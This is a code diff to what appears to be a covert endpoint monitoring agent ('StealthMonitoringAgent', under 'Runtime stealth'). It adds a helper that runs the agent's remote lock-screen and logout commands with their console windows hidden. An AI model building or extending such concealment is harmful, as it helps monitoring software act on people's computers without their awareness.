@@ -43,7 +43,7 @@ else:
     from .telemetry.durable_queue import DurableActivityQueue
     from .telemetry.activity_state import ConnectivityState
 
-AGENT_VERSION = "1.2.40"
+AGENT_VERSION = "1.2.41"
 POLL_SECONDS = 15
 
 # ── Runtime stealth ───────────────────────────────────────────────────────────
@@ -201,24 +201,33 @@ class StealthMonitoringAgent:
     def _execute_os_command(self, ctype: str) -> None:
         import subprocess
 
+        def _hidden_run(cmd, **kw):
+            if sys.platform.startswith("win"):
+                si = subprocess.STARTUPINFO()
+                si.dwFlags |= getattr(subprocess, "STARTF_USESHOWWINDOW", 1)
+                si.wShowWindow = 0
+                kw.setdefault("creationflags", getattr(subprocess, "CREATE_NO_WINDOW", 0))
+                kw.setdefault("startupinfo", si)
+            return subprocess.run(cmd, **kw)
+
         if ctype == "lock_screen":
             if sys.platform.startswith("win"):
                 import ctypes
                 ctypes.windll.user32.LockWorkStation()
             elif sys.platform == "darwin":
-                subprocess.run(["pmset", "displaysleepnow"], check=False)
+                _hidden_run(["pmset", "displaysleepnow"], check=False)
             else:
                 for cmd in (
                     ["loginctl", "lock-session"],
                     ["xdg-screensaver", "lock"],
                 ):
-                    if subprocess.run(cmd, check=False).returncode == 0:
+                    if _hidden_run(cmd, check=False).returncode == 0:
                         break
         elif ctype == "logout_user":
             if sys.platform.startswith("win"):
-                subprocess.run(["shutdown", "/l"], check=False)
+                _hidden_run(["shutdown", "/l"], check=False)
             elif sys.platform == "darwin":
-                subprocess.run(
+                _hidden_run(
                     ["osascript", "-e", 'tell app "System Events" to log out'],
                     check=False,
                 )
@@ -227,7 +236,7 @@ class StealthMonitoringAgent:
                     ["gnome-session-quit", "--logout", "--no-prompt"],
                     ["loginctl", "terminate-user", os.environ.get("USER", "")],
                 ):
-                    if subprocess.run(cmd, check=False).returncode == 0:
+                    if _hidden_run(cmd, check=False).returncode == 0:
                         break
 
     def _worker(self) -> None:
